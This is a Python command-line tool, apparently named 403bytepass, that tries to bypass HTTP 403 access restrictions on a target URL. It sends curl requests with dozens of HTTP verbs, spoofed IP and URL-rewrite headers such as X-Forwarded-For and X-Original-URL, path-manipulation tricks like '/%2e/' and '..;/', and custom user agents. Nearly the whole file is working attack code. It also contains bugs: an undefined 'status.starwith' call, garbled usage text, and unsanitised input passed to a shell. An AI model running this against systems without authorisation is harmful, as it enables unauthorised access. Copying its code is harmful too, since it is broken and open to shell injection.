import sys
import time
from os import popen


class bcolors:
        OK = '\033[92m'
        INFO = '\033[94m'
        WARNING = '\033[93m'
        FAIL = '\033[91m'
        RESET = '\033[0m'

def banner():
	print(bcolors.WARNING+'''
  ____  ___   ____  ___         __                          
 / / / / _ \ |_  / / _ ) __ __ / /_ ___  ___  ___ _ ___  ___
/_  _// // /_/_ < / _  |/ // // __// -_)/ _ \/ _ `/(_-< (_-<
 /_/  \___//____//____/ \_, / \__/ \__// .__/\_,_//___//___/
                       /___/          /_/                   
               .--.
              |.-. '----------.
              |'-' .--"--""--"/
               '--'
	'''+bcolors.RESET)


def curl_fct(options,test):
	command = popen("curl -k -s -I %s %s | grep HTTP | tail -1" % (options, test)).read()

	try:
		code = command.strip().split(" ")[1]
	except:
		print(bcolors.FAIL+"[!]"+bcolors.RESET+"No status code")
		sys.exit(1)

	if code == "200":
		command = bcolors.OK+command+bcolors.RESET

	elif code.startswith("30"):
		command = bcolors.WARNING+command+bcolors.RESET
	
	elif code.startswith("40") or status.starwith("50"):
		command = bcolors.FAIL+command+bcolors.RESET
	return command

def main():

	try:
		if len(sys.argv)>2:
			print(bcolors.INFO+"[*]"+bcolors.RESET+"Usage: python3 403bytepass.py <target>")
			sys.exit(1)
		elif len(sys.argv) == 1:
			print(bcolors.INFO+"[*]"+bcolors.RESET+"Usage: 403python3 bytepass.py <target>")
		
		target = sys.argv[1]
	except Exception as e:
		sys.exit(1)
	
	if not target.startswith("http"):
		print(bcolors.FAIL+"[!]"+bcolors.RESET+"URL must start with http:// or https://")
		print(bcolors.INFO+"[*]"+bcolors.RESET+"Usage: 403python3 bytepass.py <target>")
		sys.exit(1)

	SlashCheck = target.count("/")
	if target.endswith("/"):
		SlashCheck = SlashCheck-1
		print("Target selected: "+target)

	else:
		print(target+"/")

	if SlashCheck == 2:
		uri = ""
	else:
		print(bcolors.FAIL+"[!]"+bcolors.RESET+"URL must start with http:// or https://")
		print(bcolors.INFO+"[*]"+bcolors.RESET+"Usage: python3 403bytepass.py <target>")
		sys.exit(1)
	try:
		start=time.time()
		print("\n")
		print(bcolors.OK+"[+]"+bcolors.RESET+"Trying bypass with"+bcolors.OK+" VERB TAMPERING"+bcolors.RESET)
		print("\n")
		test = target+"/"+uri
		print("Response for GET HTTP Method: ",curl_fct("-X GET",test))
		print("Response for COPY HTTP Method: ",curl_fct("-X COPY",test))
		print("Response for OPTIONS HTTP Method: ",curl_fct(" -X OPTIONS",test))
		print("Response for PUT HTTP Method: ",curl_fct(" -X PUT",test))
		print("Response for TRACE HTTP Method: ",curl_fct(" -X TRACE",test))
		print("Response for POST HTTP Method: ",curl_fct(" -X POST",test))
		print("Response for SEARCH HTTP Method: ",curl_fct(" -X SEARCH",test))
		print("Response for MOVE HTTP Method: ",curl_fct(" -X MOVE",test))
		print("Response for PATCH HTTP Method: ",curl_fct(" -X PATCH",test))
		print("Response for ACL HTTP Method: ",curl_fct("-X ACL",test))
		print("Response for ARBITRARY HTTP Method: ",curl_fct("-X ARBITRARY",test))
		print("Respondse for BASELINE-CONTROL HTTP Method: ",curl_fct("-X BASELINE-CONTROL",test))
		print("Response for CHECKIN HTTP Method: ",curl_fct("-X CHECKIN",test))
		print("Response for CHECKOUT HTTP Method: ",curl_fct("-X CHECKOUT",test))
		print("Response for CONNECT HTTP Method: ",curl_fct("-X CONNECT",test))
		print("Response for HEAD HTTP Method: ",curl_fct(" -X HEAD -m 1",test))
		print("Response for LABEL HTTP Method: ",curl_fct(" -X LABEL",test))
		print("Response for LOCK HTTP Method: ",curl_fct(" -X LOCK",test))
		print("Response for MERGE HTTP Method: ",curl_fct(" -X MERGE",test))
		print("Response for MKACTIVITY HTTP Method: ",curl_fct(" -X MKACTIVITY",test))
		print("Response for MKCOL HTTP Method: ",curl_fct(" -X MKCOL",test))
		print("Response for MKWORKSPACE HTTP Method: ",curl_fct(" -X MKWORKSPACE",test))
		print("Response for ORDERPATCH HTTP Method: ",curl_fct(" -X ORDERPATCH",test))
		print("Response for PROPFIND HTTTP Method: ",curl_fct(" -X PROPFIND",test))
		print("Response for PROPPATCH HTTP Method: ",curl_fct(" -X PROPPATCH",test))
		print("Response for REPORT HTTP Method: ",curl_fct(" -X REPORT",test))
		print("Response for UNCHECKOUT HTTP Method: ",curl_fct(" -X UNCHECKOUT",test))
		print("Response for UNLOCK HTTP Method: ",curl_fct(" -X UNLOCK",test))
		print("Response for UPDATE HTTP Method: ",curl_fct(" -X UPDATE",test))
		print("Response for VERSION-CONTROL HTTP Method: ",curl_fct(" -X VERSION-CONTROL",test))
		
		print("\n")
		print(bcolors.OK+"[+]"+bcolors.RESET+"Try bypass with"+bcolors.OK+" HEADER"+bcolors.RESET)
		print("\n")
		print("HEADER -> Referer : ",curl_fct(" -X GET -H \"Referer: "+test+"\"",test))
		print("HEADER -> X-Custom-IP-Authorization: ",curl_fct(" -X GET -H \"X-Custom-IP-Authorization: 127.0.0.1\"",test))
		test=target+"/"+uri+"..\;"
		print("HEADER -> X-Custom-IP-Authorization + ..;: ",curl_fct(" -X GET -H \"X-Custom-IP-Authorization: 127.0.0.1\"",test))
		test=target+"/"
		print("HEADER -> X-Original-URL: ",curl_fct(" -X GET -H \"X-Original-URL: /"+uri+"\"",test))
		print("HEADER -> X-Rewrite-URL: ",curl_fct(" -X GET -H \"X-Rewrite-URL: /"+uri+"\"",test))
		test=target+"/"+uri
		print("HEADER -> X-Originating-IP: ",curl_fct(" -X GET -H \"X-Originating-IP: 127.0.0.1\"",test))
		print("HEADER -> X-Forwarded-For: ",curl_fct(" -X GET -H \"X-Forwarded-For: 127.0.0.1\"",test))
		print("HEADER -> X-Remote-IP: ",curl_fct(" -X GET -H \"X-Remote-IP: 127.0.0.1\"",test))
		print("HEADER -> X-Client-IP: ",curl_fct(" -X GET -H \"X-Client-IP: 127.0.0.1\"",test))
		print("HEADER -> X-Host: ",curl_fct(" -X GET -H \"X-Host: 127.0.0.1\"",test))
		print("HEADER -> X-Forwarded-Host: ",curl_fct(" -X GET -H \"X-Forwarded-Host: 127.0.0.1\"",test))
		print("\n")

		print(bcolors.OK+"[+]"+bcolors.RESET+"Try bypass with"+bcolors.OK+" Bug Bounty Tricks"+bcolors.RESET)
		print("\n")
		test=target+"/%2e/"+uri
		print("Response with /%2e/ between: ",curl_fct(" -X GET",test))
		test=target+"/"+uri+"/."
		print("Response ending with /. : ",curl_fct(" -X GET --path-as-is",test))
		print("Response ending with ?: ",curl_fct(" -X GET",test))
		test=target+"/"+uri+"??"
		print("Response ending with ??: ",curl_fct(" -X GET",test))
		test=target+"/"+uri+"//"
		print("Response ending with //: ",curl_fct(" -X GET",test))
		test=target+"/./"+uri+"/./"
		print("Response beween and ending with /./ : ",curl_fct(" -X GET --path-as-is",test))
		test=target+"/"+uri+"/"
		print("Response ending with /: ",curl_fct(" -X GET",test))
		test=target+"/"+uri+"/.string"
		print("Response ending with .string: ",curl_fct(" -X GET",test))
		test=target+"/"+uri+"..\;/"
		print("Response ending with ..; : ",curl_fct(" -X GET --path-as-is",test))
		test=target+"/.\;/"+uri
		print("Response with /.;/ between: ",curl_fct(" -X GET --path-as-is",test))
		test=target+"\;foo=bar/"+uri
		print("Response  with ;foo=bar;/ between: ",curl_fct(" -X GET --path-as-is",test))
		stop=time.time()
		Time=stop-start
		print("\n")
		
		print(bcolors.OK+"[+]"+bcolors.RESET+"Try bypass with"+bcolors.OK+" Custom User Agent"+bcolors.RESET)
		test=target+"/"+uri

		with open("UserAgents.txt") as f:
			for payload in f:
				paystrip=payload.strip()
				print(paystrip+": "+curl_fct(" -X GET -H \"User-Agent: "+paystrip+"\"",test))


		print(bcolors.OK+"[+]"+bcolors.RESET+"Tests finished")
		print(bcolors.OK+"[+]"+bcolors.RESET+"Testing time:", Time)

	except Exception as e:
		print(bcolors.FAIL+"[!]"+bcolors.RESET+"An error occured")
		print(e)
	except KeyboardInterrupt:
		print(bcolors.FAIL+"[!]"+bcolors.RESET+"Key Interruption: Coming back home")

try:
	banner()
	main()
except Exception as e:
	print(e)
